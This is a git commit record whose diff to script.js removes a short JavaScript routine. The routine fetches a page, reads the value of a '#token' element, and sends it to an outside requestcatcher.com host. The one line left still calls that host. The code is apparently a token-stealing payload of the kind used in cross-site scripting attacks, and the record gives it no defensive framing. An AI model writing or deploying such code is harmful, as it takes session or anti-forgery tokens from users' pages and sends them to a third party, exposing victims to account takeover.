fe40cab48328adb0b3ba124c9a29c9544356b00b
fullgitstack <mackormack0@gmail.com>
2025-10-06 18:22:02 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,17 +1,1 @@
 fetch('https://yt54h.requestcatcher.com/test')
-  .then(response => {
-    
-    return response.text()
-  })
-  .then(html => {
-    const parser = new DOMParser()
-
-    const doc = parser.parseFromString(html, "text/html")
-
-    const token = doc.querySelector('#token').value
-
-    fetch(`https://yt54h.requestcatcher.com/${token}`)
-  })
-  .catch(error => {
-     console.error('Failed to fetch page')
-  })
